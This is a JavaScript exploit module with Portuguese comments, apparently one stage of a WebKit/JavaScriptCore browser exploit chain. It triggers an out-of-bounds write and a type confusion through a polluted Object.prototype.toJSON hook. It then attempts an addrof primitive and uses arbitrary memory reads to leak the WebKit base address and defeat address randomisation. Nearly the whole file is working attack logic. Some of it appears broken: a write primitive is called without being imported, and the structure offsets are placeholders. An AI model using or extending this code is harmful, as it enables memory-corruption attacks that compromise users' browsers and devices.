// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43 - WebKit Base Leak Attempt)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read, // Usaremos este para ler ponteiros internos
    // oob_write_absolute, // Não usado diretamente nesta versão para o scan, mas usado pelo core
    // oob_read_absolute,  // Não usado diretamente nesta versão para o scan, mas usado pelo core
    isOOBReady,
    selfTestOOBReadWrite, // Para um sanity check inicial
    selfTestTypeConfusionAndMemoryControl // Para um sanity check inicial
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Offset para o Heisenbug
const OOB_WRITE_VALUES_V82 = [0xABABABAB, 0xCDCDCDCD];

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10;

// Constantes para o vazamento do WebKit (EXEMPLO - ESTES VALORES SÃO ESPECÍFICOS DA VERSÃO DO MOTOR!)
// Em um cenário real, estes offsets seriam determinados por engenharia reversa.
const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x18); // Exemplo: offset dentro do objeto função para JSScope ou Executable
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x8);   // Exemplo: offset dentro da estrutura Executable para código JIT ou ponteiro para VM

// Objeto alvo para o addrof e subsequente leitura de ponteiros
const targetFunctionForLeak = function someUniqueLeakFunctionR43() { return "target_R43"; };
let leaked_target_function_addr = null; // Armazenará o endereço da targetFunctionForLeak

// Função auxiliar para verificar se um AdvancedInt64 parece ser um ponteiro válido
function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    // Filtros básicos: não nulo, não é um double pequeno 'disfarçado', e geralmente na parte alta da memória (kernel) ou parte baixa (usuário)
    // Estes limites são muito genéricos e podem precisar de ajuste.
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false; // Nulo
    if (high === 0x7FF00000 && (low & 0xFFF00000) === 0xFFF00000) return false; // NaN/Inf
    if (high === 0 && low < 0x10000) return false; // Endereços muito baixos geralmente não são válidos para objetos heap/código.
    // Verifica se é um ponteiro plausible (ex: não aponta para o kernel se for uma v8 x64 moderna)
    // Para JavaScriptCore em um sistema de 64 bits, ponteiros para código/heap podem estar em vários lugares.
    // 0x000100000000 - 0x0002FFFFFFFF é uma faixa comum para JIT/Heap em alguns sistemas.
    // Endereços muito altos (ex: > 0x7FFF00000000) são geralmente kernel.
    return !(high > 0x0 && high < 0x100 && low === 0); // Exclui valores como 0x1.0, 0x2.0 que podem ser doubles
}


function advInt64LessThanOrEqual(a, b) {
    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
        logS3(`[advInt64LessThanOrEqual] Comparação inválida. A: ${typeof a}, B: ${typeof b}`, 'error');
        return false;
    }
    if (a.high() < b.high()) return true;
    if (a.high() > b.high()) return false;
    return a.low() <= b.low();
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43...`;

    // --- Sanity Checks Opcionais ---
    logS3(`--- Fase 0 (R43): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
        if (!coreOOBReadWriteOK) {
           logS3("AVISO CRÍTICO: selfTestOOBReadWrite falhou. As primitivas OOB podem estar instáveis. arb_read provavelmente não funcionará.", "critical", FNAME_CURRENT_TEST_BASE);
        }
        const coreTCAndMemControlOK = await selfTestTypeConfusionAndMemoryControl(logS3);
        logS3(`Sanity Check (selfTestTypeConfusionAndMemoryControl): ${coreTCAndMemControlOK ? 'SUCESSO' : 'FALHA'}`, coreTCAndMemControlOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);

    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    await PAUSE_S3(100);
    // --- Fim Sanity Checks ---

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43): Not run.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43): Not run.", webkit_base_candidate: null, internal_ptr: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_function_addr = null; // Reset para cada iteração
        const current_oob_hex_val = toHex(current_oob_value !== undefined && current_oob_value !== null ? current_oob_value : 0);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R43: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R43): Not run in this iter.", leaked_object_addr: null };

        // Closure para o toJSON - agora focado em um addrof mais robusto
        function toJSON_TA_Probe_Iter_Closure_R43() {
            probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');
            logS3(`[PROBE_R43] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`, "leak");

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R43" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R43", payload_M2: marker_M2_ref_iter };
                    return marker_M1_ref_iter;
                } else if (is_m2c) { // 'this' é o marker_M2_ref_iter (objeto type-confused)
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43", this_type: "[object Object]",
                            this_is_M2: true, getter_defined: false, direct_prop_set: false, getter_fired: true, // Simula getter para addrof
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R43] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`, "vuln");
                    }

                    // Tentativa de Addrof
                    if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.call_number_tc_detected === call_num) {
                        if (!victim_typed_array_ref_iter?.buffer) {
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                            return "addrof_victim_null";
                        }
                        let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                        const original_low = uint32_view[0]; const original_high = uint32_view[1];

                        try {
                            // Escreve o objeto alvo no buffer (type-pun)
                            float_view[0] = targetFunctionForLeak;
                            const leaked_low = uint32_view[0];
                            const leaked_high = uint32_view[1];
                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                            
                            iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                            logS3(`[PROBE_R43_ADDROF] Candidate Addr for targetFunctionForLeak: ${potential_addr.toString(true)}`, "leak");

                            if (isValidPointer(potential_addr)) {
                                leaked_target_function_addr = potential_addr; // Salva globalmente para esta iteração
                                iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                iter_addrof_result.success = true;
                                iter_addrof_result.msg = "Addrof (R43): Sucesso ao obter endereço candidato da função.";
                                if (iteration_final_tc_details_from_probe) {
                                    iteration_final_tc_details_from_probe.leak_val_getter_int64 = potential_addr.toString(true);
                                    iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                }
                                logS3(`[PROBE_R43_ADDROF] SUCESSO! Endereço de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "vuln");
                            } else {
                                iter_addrof_result.msg = `Addrof (R43): Endereço candidato (${potential_addr.toString(true)}) não parece ponteiro válido.`;
                                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = potential_addr.toString(true) + " (invalido)";
                            }
                        } catch (e_addrof) {
                            iter_addrof_result.msg = `Addrof (R43) EXCEPTION: ${e_addrof.message}`;
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_ex:${e_addrof.message}`;
                        } finally {
                            // Restaura o valor original no buffer para evitar corromper a heap se possível
                            uint32_view[0] = original_low;
                            uint32_view[1] = original_high;
                        }
                    }
                    return this; // Retorna o M2 modificado ou não
                }
            } catch (e_pm) {
                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm.message}`;
                return { err_pm: call_num, msg: e_pm.message };
            }
            return { gen_m: call_num, type: ctts };
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null;
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43): Not run in this iter.", webkit_base_candidate: null, internal_ptr: null };
        let heisenbugConfirmedThisIter = false;

        try {
            logS3(`  --- Fase 1 (R43): Detecção de Type Confusion & Addrof ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                logS3(`  TC/Addrof Probe R43: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0, 200) + "..." : "N/A"}`, "info");
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output }; }

                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Probe R43: TC on M2 CONFIRMED. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || 'N/A'}`, "vuln");
                    if (iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error = new Error(iteration_final_tc_details_from_probe.error_probe);
                } else {
                    logS3(`  TC Probe R43: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC/Addrof Probe R43: JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Fase 1 (R43) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest");
            await PAUSE_S3(100);

            // Fase 2: WebKit Base Leak (usando arb_read)
            logS3(`  --- Fase 2 (R43): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_function_addr) {
                if (!coreOOBReadWriteOK) { // Verifica o resultado do sanity check
                    iter_webkit_leak_result.msg = "WebKit Leak (R43): Pulado. Primitivas OOB do CoreExploit falharam no sanity check (selfTestOOBReadWrite). arb_read provavelmente instável.";
                    logS3(iter_webkit_leak_result.msg, "critical");
                } else if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                     await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheck` });
                     if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (R43): Falha ao preparar ambiente OOB para arb_read.";
                        logS3(iter_webkit_leak_result.msg, "error");
                     }
                }
                
                if (isOOBReady()) { // Prossiga apenas se OOB estiver realmente pronto
                    try {
                        logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info');

                        // 1. Ler ponteiro para Executable/JSScope a partir do objeto função
                        const ptr_to_executable_or_scope = await arb_read(leaked_target_function_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                        if (!isValidPointer(ptr_to_executable_or_scope)) {
                            throw new Error(`Ponteiro para Executable/Scope inválido ou nulo: ${isAdvancedInt64Object(ptr_to_executable_or_scope) ? ptr_to_executable_or_scope.toString(true) : String(ptr_to_executable_or_scope)}`);
                        }
                        logS3(`  WebKitLeak: Ponteiro para Executable/Scope lido de [func_addr + ${JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_or_scope.toString(true)}`, 'leak');
                        iter_webkit_leak_result.internal_ptr_stage1 = ptr_to_executable_or_scope.toString(true);

                        // 2. Ler ponteiro para JIT Code/VM a partir da estrutura Executable/Scope
                        const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_or_scope.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                        if (!isValidPointer(ptr_to_jit_or_vm)) {
                            throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm)}`);
                        }
                        logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
                        iter_webkit_leak_result.internal_ptr_stage2 = ptr_to_jit_or_vm.toString(true);

                        // 3. Estimar o base address (ex: alinhando para 1MB ou 4KB)
                        // Este é um palpite; o alinhamento real pode variar.
                        const page_mask_1mb = new AdvancedInt64(0x0, ~0xFFFFF); // Máscara para alinhar em 1MB (0x...FFFFF00000) - exemplo
                        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);   // Máscara para alinhar em 4KB (0x...FFFFF000)
                        
                        // Tentar com o ponteiro JIT/VM que geralmente está mais fundo na biblioteca
                        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb); // Usando 4KB como um palpite comum

                        iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                        iter_webkit_leak_result.success = true;
                        iter_webkit_leak_result.msg = `WebKitLeak (R43): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

                    } catch (e_webkit_leak) {
                        iter_webkit_leak_result.msg = `WebKitLeak (R43) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                        logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error");
                        if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                    }
                }

            } else {
                 let skipMsg = "WebKitLeak (R43): Pulado. ";
                 if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                 if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                 if (!leaked_target_function_addr) skipMsg += "Endereço da função alvo não obtido. ";
                 iter_webkit_leak_result.msg = skipMsg;
            }
            logS3(`  --- Fase 2 (R43) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, "subtest");

        } catch (e_outer) {
            if (!iter_primary_error) iter_primary_error = e_outer;
            logS3(`  CRITICAL ERROR ITERATION R43: ${e_outer.message || String(e_outer)}`, "critical");
        } finally {
            clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
            stringifyResult: iter_stringify_output_parsed,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        // Lógica para best_result_for_runner (R43)
        let current_iter_is_better = false;
        if (iter_primary_error === null) { // Sem erro primário nesta iteração
            const current_score = (iter_webkit_leak_result.success ? 4 : 0) + (iter_addrof_result.success ? 2 : 0) + (heisenbugConfirmedThisIter ? 1 : 0);
            const best_score = (best_result_for_runner.webkit_leak_result?.success ? 4 : 0) + (best_result_for_runner.addrof_result?.success ? 2 : 0) + (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);

            if (current_score > best_score) {
                current_iter_is_better = true;
            } else if (current_score === best_score && current_score > 0 && !best_result_for_runner.oob_value_used) {
                 current_iter_is_better = true; // Primeira iteração válida com o mesmo score
            }
        }
        
        if(current_iter_is_better) {
            best_result_for_runner = {
                errorOccurred: current_iter_summary.error,
                tc_probe_details: current_iter_summary.tc_probe_details,
                stringifyResult: current_iter_summary.stringifyResult,
                addrof_result: current_iter_summary.addrof_result_this_iter,
                webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                oob_value_used: current_iter_summary.oob_value, // Corrigido aqui
                heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             // Se nenhuma iteração "boa" foi encontrada, pega a última (mesmo com erro)
            best_result_for_runner = {
                errorOccurred: current_iter_summary.error,
                tc_probe_details: current_iter_summary.tc_probe_details,
                stringifyResult: current_iter_summary.stringifyResult,
                addrof_result: current_iter_summary.addrof_result_this_iter,
                webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                oob_value_used: current_iter_summary.oob_value,
                heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
            };
        }


        if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43: WebKitLeak OK!`;
        else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43: Addrof OK`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE}_R43: TC OK`;
        else document.title = `${FNAME_CURRENT_TEST_BASE}_R43: Iter Done`;
        await PAUSE_S3(250);
    }
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R43): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
